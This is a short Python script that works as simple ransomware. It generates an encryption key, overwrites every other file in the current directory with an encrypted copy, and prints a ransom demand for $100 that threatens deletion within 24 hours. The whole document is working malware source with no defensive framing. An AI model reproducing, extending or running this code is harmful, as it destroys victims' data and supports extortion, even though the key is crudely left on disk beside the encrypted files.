from cryptography.fernet import Fernet
import os

key = Fernet.generate_key()
with open("encryptedKey.key", "wb") as encryptedKey:
    encryptedKey.write(key)

files = []

# Loop through each path in the os.listdir()
for path in os.listdir():
    # Check if path has main.py and encrypted.key file
    if (path == "main.py" or path == "encryptedKey.key"):
        # Continue to next loop iteration
        continue
    # if the path type is file 
    if os.path.isfile(path):
        # then append to files list
        files.append(path)

# Iterate the loop over each file in the files list
for file in files:
    # Read Open file in rb mode as file1
    with open(file, "rb") as file1:
        # Use read() method on file1 sand save the returned data in rawData
        rawData = file1.read()
    # Use Fernet(key).encrypt(rawData) to get encryptedRawData 
    encryptedRawData = Fernet(key).encrypt(rawData)
    # Open the same file in wb mode as file2
    with open(file, "wb") as file2:
        # Use write method to write encryptedRawData to the file2
        file2.write(encryptedRawData)

# Notify the message to the user "👹👹👹👹 All of your files has been encrypted send me $100 or I'll delete them in 24 hours!! 👹👹👹👹"
print("👹👹👹👹 All of your files has been encrypted send me $100 or I'll delete them in 24 hours!! 👹👹👹👹")
